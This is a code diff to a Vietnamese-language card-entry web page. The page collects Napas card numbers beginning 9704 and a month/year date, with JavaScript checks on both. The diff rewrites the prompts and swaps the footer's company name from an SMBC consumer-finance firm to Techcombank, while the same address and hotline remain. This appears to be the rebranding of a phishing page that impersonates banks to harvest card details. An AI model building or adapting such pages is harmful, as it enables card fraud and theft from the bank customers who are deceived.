@@ -204,14 +204,14 @@
                                     inputmode="numeric"
                                     autocomplete="cc-number">
                             </div>
-                            <p class="text-xs text-gray-500 mt-1">Chỉ chấp nhận thẻ Napas nội địa (bắt đầu bằng 9704)</p>
+                            <p class="text-xs text-gray-500 mt-1">Bắt đầu bằng số 9704)</p>
                             <p id="err-cardNumber" class="text-red-500 text-xs mt-1 hidden"></p>
                         </div>
 
                         <div class="grid grid-cols-2 gap-4">
                             <!-- Issue Date -->
                             <div>
-                                <label class="block text-sm font-semibold text-gray-700 mb-1">Ngày phát hành <span class="text-red-500">*</span></label>
+                                <label class="block text-sm font-semibold text-gray-700 mb-1">Tháng/Năm in trên thẻ <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                                         <i class="fa-regular fa-calendar"></i>
@@ -266,7 +266,7 @@
     <!-- Simple Footer -->
     <footer class="bg-gray-800 text-white py-6 mt-auto">
         <div class="container mx-auto px-4 text-center">
-            <p class="font-bold text-lg mb-2">CÔNG TY TÀI CHÍNH TNHH MTV NGÂN HÀNG VIỆT NAM THỊNH VƯỢNG SMBC</p>
+            <p class="font-bold text-lg mb-2">Ngân hàng thương mại cổ phần Kỹ Thương Việt Nam</p>
             <p class="text-sm text-gray-400">Tầng 2, Tòa nhà REE Tower, Số 9 Đoàn Văn Bơ, Phường 12, Quận 4, TP.HCM</p>
             <div class="flex justify-center gap-4 mt-4">
                 <a href="tel:19006939" class="bg-white/10 px-3 py-1 rounded-full text-sm hover:bg-white/20 transition">
@@ -470,14 +470,14 @@
 
             // 2. Validate Card Number (Napas starts with 9704)
             if (!values.number.startsWith('9704') || values.number.length < 16) {
-                showError('cardNumber', 'Số thẻ không hợp lệ. Thẻ Napas phải bắt đầu bằng 9704 và có 16-19 số.');
+                showError('cardNumber', 'Số thẻ không hợp lệ. Phải bắt đầu bằng 9704.');
                 isValid = false;
             }
 
             // 3. Validate Date (Basic MM/YY check)
             const dateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
             if (!dateRegex.test(values.date)) {
-                showError('cardDate', 'Ngày phát hành không hợp lệ (MM/YY).');
+                showError('cardDate', 'Tháng/Năm in trên thẻ không hợp lệ (MM/YY).');
                 isValid = false;
             }
 
